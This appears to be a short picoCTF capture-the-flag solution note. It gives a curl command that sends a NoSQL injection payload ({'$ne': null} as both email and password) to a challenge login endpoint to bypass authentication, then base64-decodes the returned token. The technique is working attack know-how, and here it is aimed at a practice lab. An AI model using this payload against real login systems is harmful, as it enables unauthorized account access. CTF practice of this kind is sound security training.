curl -X POST \
-H "Content-Type: application/json" \
-d '{"email": "{\"$ne\": null}", "password": "{\"$ne\": null}"}' \
http://atlas.picoctf.net:64973/login

get response with token

base64 decode
echo -n "token" | base64 -d
